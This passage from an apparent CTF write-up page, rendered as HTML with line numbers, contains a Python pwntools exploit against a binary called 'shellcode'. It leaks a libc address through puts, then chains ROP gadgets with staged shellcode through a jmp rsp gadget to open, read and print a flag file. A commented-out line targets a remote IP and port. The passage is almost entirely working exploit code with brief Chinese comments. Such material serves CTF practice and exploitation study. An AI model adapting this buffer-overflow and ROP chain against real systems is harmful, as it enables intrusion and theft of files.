pan><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">p =process(&quot;./shellcode&quot;)</span><br><span class="line">elf=ELF(&#x27;shellcode&#x27;)</span><br><span class="line">#p = remote(&#x27;39.100.87.38&#x27;,23081)</span><br><span class="line">pop_rdi_ret=0x0000000000400863</span><br><span class="line">jmp_rsp=0x0000000000400785</span><br><span class="line">vuln=0x000000000400760</span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">#第一段shellcode，制造一个flag，地址给r12（给rdi会被中途破坏掉）给open预备里面有push，所以是0x28</span><br><span class="line">shellcode1=&#x27;&#x27;&#x27;</span><br><span class="line">    push 0x67616c66</span><br><span class="line">    mov r12,rsp</span><br><span class="line">    sub rsp,0x28 </span><br><span class="line">    ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#拿到libc</span><br><span class="line">payload=p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)+b&#x27;a&#x27;*8+p64(jmp_rsp)+asm(shellcode1) #8字节</span><br><span class="line">p.sendlineafter(&quot;Can u pwn me?&quot;,payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">open_addr = libc_base + libc.dump(&#x27;open&#x27;)</span><br><span class="line">read_addr = libc_base + libc.dump(&#x27;read&#x27;)</span><br><span class="line">write_addr = libc_base + libc.dump(&#x27;write&#x27;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">ret_addr=0x000000000040053e</span><br><span class="line">#利用第一个sc放到r12里的flag传给rdi，准备好所有寄存器，调用open</span><br><span class="line">shellcode2=&#x27;&#x27;&#x27;</span><br><span class="line">mov rdi,r12</span><br><span class="line">xor esi,esi</span><br><span class="line">sub rsp,0x30</span><br><span class="line">ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload=p64(open_addr)+p64(main)+b&#x27;a&#x27;*24+p64(jmp_rsp)+asm(shellcode2) #8字节</span><br><span class="line">p.sendlineafter(&quot;Can u pwn me?&quot;,payload)</span><br><span class="line"></span><br><span class="line">#准备read的寄存器</span><br><span class="line">shellcode3=&#x27;&#x27;&#x27;</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    mov edx,0x100</span><br><span class="line">    xor eax,eax</span><br><span class="line">    sub rsp,0x30</span><br><span class="line">    ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#调用read</span><br><span class="line">payload=p64(pop_rdi_ret) + p64(3) + p64(read_addr) + p64(main)+b&#x27;a&#x27;*8+p64(jmp_rsp)+asm(shellcode3) #8字节</span><br><span class="line">p.sendafter(&quot;Can u pwn me?&quot;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#直接调用write(1,file,0x100)</span><br><span class="line">shellcode4=&#x27;&#x27;&#x27;</span><br><span class="line">    mov edi,1</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    push 1</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload=p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)+b&#x27;a&#x27;*8+p64(jmp_rsp)+asm(shellcode4) #8字节</span><br><span class="line">p.sendlineafter(&quot;Can u pwn me?&quot;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
